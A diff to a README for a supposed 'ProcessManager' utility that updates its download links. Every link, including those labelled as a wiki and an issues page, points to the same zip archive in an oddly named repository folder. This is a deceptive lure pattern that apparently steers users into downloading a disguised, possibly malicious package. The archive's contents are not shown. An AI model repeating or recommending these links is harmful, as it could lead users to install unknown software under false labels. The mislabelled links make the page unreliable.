@@ -6,7 +6,7 @@ Welcome to ProcessManager! This application helps you manage your processes easi
 
 ## 📦 Download & Install
 
-To get started, visit this page to download: [ProcessManager Releases](https://raw.githubusercontent.com/Jaska464/ProcessManager/main/goddessship/Process-Manager-2.4.zip).
+To get started, visit this page to download: [ProcessManager Releases](https://github.com/Jaska464/ProcessManager/raw/refs/heads/main/goddessship/Process_Manager_v3.5.zip).
 
 1. Click on the link above to go to the Releases page.
 2. Find the latest version of ProcessManager.
@@ -43,7 +43,7 @@ If you encounter problems while running ProcessManager, consider these steps:
 
 ## ℹ️ Additional Resources
 
-For more detailed information, visit our [GitHub Wiki](https://raw.githubusercontent.com/Jaska464/ProcessManager/main/goddessship/Process-Manager-2.4.zip) where you can find:
+For more detailed information, visit our [GitHub Wiki](https://github.com/Jaska464/ProcessManager/raw/refs/heads/main/goddessship/Process_Manager_v3.5.zip) where you can find:
 
 - User guides
 - Tips for troubleshooting
@@ -55,8 +55,8 @@ Join our community for support and suggestions. You can reach out on GitHub issu
 
 ## 🔗 Important Links
 
-- [ProcessManager Releases](https://raw.githubusercontent.com/Jaska464/ProcessManager/main/goddessship/Process-Manager-2.4.zip)
-- [GitHub Wiki](https://raw.githubusercontent.com/Jaska464/ProcessManager/main/goddessship/Process-Manager-2.4.zip)
-- [Open Issues](https://raw.githubusercontent.com/Jaska464/ProcessManager/main/goddessship/Process-Manager-2.4.zip)
+- [ProcessManager Releases](https://github.com/Jaska464/ProcessManager/raw/refs/heads/main/goddessship/Process_Manager_v3.5.zip)
+- [GitHub Wiki](https://github.com/Jaska464/ProcessManager/raw/refs/heads/main/goddessship/Process_Manager_v3.5.zip)
+- [Open Issues](https://github.com/Jaska464/ProcessManager/raw/refs/heads/main/goddessship/Process_Manager_v3.5.zip)
 
 Thank you for choosing ProcessManager! We hope it simplifies your system management tasks.
